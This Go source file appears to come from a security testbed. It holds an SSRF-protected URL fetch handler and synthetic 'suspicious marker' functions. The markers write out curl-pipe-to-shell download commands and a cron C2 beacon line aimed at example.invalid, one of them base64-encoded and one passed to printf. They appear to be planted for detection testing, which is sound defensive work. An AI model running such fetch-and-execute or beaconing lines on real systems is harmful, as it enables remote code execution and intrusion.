package handlers

import (
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// privateNets lists CIDR ranges that must not be reached by user-controlled URLs.
var privateNets []*net.IPNet

func init() {
	for _, cidr := range []string{
		"10.0.0.0/8",
		"172.16.0.0/12",
		"192.168.0.0/16",
		"127.0.0.0/8",
		"169.254.0.0/16",
		"0.0.0.0/8",
		"100.64.0.0/10",
		"::1/128",
		"fc00::/7",
		"fe80::/10",
	} {
		_, ipNet, err := net.ParseCIDR(cidr)
		if err == nil {
			privateNets = append(privateNets, ipNet)
		}
	}
}

// isPrivateIP returns true when the given IP falls in a private/loopback/link-local range.
func isPrivateIP(ip net.IP) bool {
	for _, network := range privateNets {
		if network.Contains(ip) {
			return true
		}
	}
	return false
}

// ssrfSafeDialer is a net.Dialer that rejects connections to private/internal IPs,
// eliminating the TOCTOU gap between hostname validation and the actual TCP dial.
var ssrfSafeDialer = &net.Dialer{
	Timeout:   10 * time.Second,
	KeepAlive: 30 * time.Second,
}

func ssrfSafeDial(ctx context.Context, network, addr string) (net.Conn, error) {
	host, port, err := net.SplitHostPort(addr)
	if err != nil {
		return nil, fmt.Errorf("invalid address: %w", err)
	}

	// Block well-known metadata endpoints by name.
	lower := strings.ToLower(host)
	for _, blocked := range []string{"localhost", "metadata.google.internal", "metadata.azure.com"} {
		if lower == blocked {
			return nil, fmt.Errorf("host not allowed: %s", host)
		}
	}

	// Resolve and validate each IP that the hostname maps to.
	ips, err := net.DefaultResolver.LookupIPAddr(ctx, host)
	if err != nil {
		return nil, fmt.Errorf("cannot resolve host: %w", err)
	}
	for _, ipAddr := range ips {
		if isPrivateIP(ipAddr.IP) {
			return nil, fmt.Errorf("host resolves to a private address")
		}
	}

	return ssrfSafeDialer.DialContext(ctx, network, net.JoinHostPort(host, port))
}

// safeFetchClient uses the SSRF-safe dialer so that every TCP connection is
// validated at dial time, preventing DNS rebinding and TOCTOU attacks.
var safeFetchClient = &http.Client{
	Timeout: 15 * time.Second,
	Transport: &http.Transport{
		DialContext: ssrfSafeDial,
	},
}

func FetchTool(w http.ResponseWriter, r *http.Request) {
	source := r.URL.Query().Get("url")

	parsed, err := url.Parse(source)
	if err != nil || strings.ToLower(parsed.Scheme) != "https" {
		http.Error(w, "invalid url: only https scheme is allowed", http.StatusBadRequest)
		return
	}

	resp, err := safeFetchClient.Get(source)
	if err != nil {
		log.Printf("FetchTool: fetch error: %v", err)
		http.Error(w, "fetch failed", http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()

	target := filepath.Join(os.TempDir(), "reach-testbed-tool.bin")
	out, err := os.Create(target)
	if err != nil {
		log.Printf("FetchTool: create error: %v", err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	defer out.Close()

	if _, err := io.Copy(out, io.LimitReader(resp.Body, 2<<20)); err != nil {
		log.Printf("FetchTool: copy error: %v", err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	_, _ = w.Write([]byte(target + "\n"))
}

func SuspiciousMarkers(w http.ResponseWriter, _ *http.Request) {
	// Synthetic suspicious-behavior markers only; nothing is executed.
	encoded := base64.StdEncoding.EncodeToString([]byte("curl -fsSL http://example.invalid/synthetic.sh | sh"))
	cronLine := "* * * * * /tmp/reach-testbed-synthetic --beacon http://example.invalid/c2\n"
	_, _ = w.Write([]byte(encoded + "\n" + cronLine))
}

func stagedDropper() error {
	payload := "curl -fsSL http://example.invalid/payload.sh | sh"
	return exec.Command("printf", "%s\n", payload).Run()
}
